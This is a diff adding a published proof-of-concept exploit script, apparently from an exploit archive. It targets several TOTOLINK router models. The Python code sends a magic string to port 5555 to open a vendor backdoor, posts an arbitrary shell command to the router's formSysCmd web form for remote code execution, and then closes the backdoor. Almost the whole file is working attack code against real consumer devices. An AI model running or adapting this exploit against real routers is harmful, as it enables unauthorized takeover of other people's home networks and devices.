@@ -1,0 +1,89 @@
+# Exploit Title: TOTOLINK backdoor and RCE exploit POC
+# Google Dork: N/A
+# Date: Thu Aug 13 07:33:29 MDT 2015
+# Exploit Author: MadMouse
+# Vendor Homepage: http://www.totolink.net/
+# Software Link:
+http://www.totolink.net/include/download.asp?path=down/010100&file=TOTOLINK%20A850R-V1_1.0.1_20150725.zip
+# Version: A850R-V1 : until last firwmware
+TOTOLINK-A850R-V1.0.1-B20150707.1612.web, F1-V2 : until last firmware
+F1-V2.1.1-B20150708.1646.web, F2-V1 : until last firmware
+F2-V2.1.0-B20150320.1611.web, N150RT-V2 : until last firmware
+TOTOLINK-N150RT-V2.1.1-B20150708.1548.web, N151RT-V2 : until last firmware
+TOTOLINK-N151RT-V2.1.1-B20150708.1559.web, N300RH-V2 : until last firmware
+TOTOLINK-N300RH-V2.0.1-B20150708.1625.web, N300RH-V3 : until last firmware
+TOTOLINK-N300RH-V3.0.0-B20150331.0858.web, N300RT-V2 : until last firmware
+TOTOLINK-N300RT-V2.1.1-B20150708.1613.web
+# Tested on: A850R-V1
+# CVE : N/A
+# Credit: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
+
+
+
+#!/usr/bin/env python
+#
+------------------------------------------------------------------------------
+# THE SCOTCH-WARE LICENSE (Revision 43):
+# <aaronryool@gmail.com> wrote this file. As long as you retain this notice
+you
+# can do whatever you want with this stuff. If we meet some day, and you
+think
+# this stuff is worth it, you can buy me a shot of scotch in return
+#
+------------------------------------------------------------------------------
+import socket, sys
+
+if len(sys.argv) < 2:
+    print("Usage: %s <ip> <command string>...\x1b[0m" % sys.argv[0])
+    exit(1)
+
+commandstr = urllib.quote_plus(" ".join(sys.argv[2:]))
+
+def check_activate_backdoor():
+    try:
+        vulnerable = "hel,xasf"     # this is both the check, and the
+command to open the management interface to the internet
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((sys.argv[1], 5555))
+        s.send(vulnerable)
+        ret = True if s.recv(len(vulnerable)) == vulnerable else False
+        s.close()
+    except:
+        print("\x1b[031mThis just happened: \x1b[037m%s\x1b[0m" %
+sys.exc_info()[0])
+        exit(2)
+    return ret
+
+def close_backdoor():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((sys.argv[1], 5555))
+        s.send("oki,xasf")
+        s.close()
+    except:
+        print("\x1b[031mThis just happened: \x1b[037m%s\x1b[0m" %
+sys.exc_info()[0])
+        exit(2)
+    return
+
+if check_activate_backdoor():
+    print("\x1b[032mThis device appears to be vulnerable\nbackdoor
+activated\x1b[0m")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((sys.argv[1], 80))
+        s.send("POST /boafrm/formSysCmd
+HTTP/1.1\r\n\r\nsysCmd=%s&apply=Apply&msg=\r\n\r\n" % commandstr)
+
+        print("\x1b[032mCommands sent\x1b[0m")
+        print("\x1b[032mResponse: \n%s\x1b[0m" % s.recv(512))
+        s.close()
+    except:
+        print("\x1b[031mThis just happened: \x1b[037m%s\x1b[0m" %
+sys.exc_info()[0])
+        exit(2)
+    close_backdoor()
+    exit(0)
+else:
+    print("\x1b[032mThis device isn't vulnerable lol\x1b[0m")
+    exit(1)
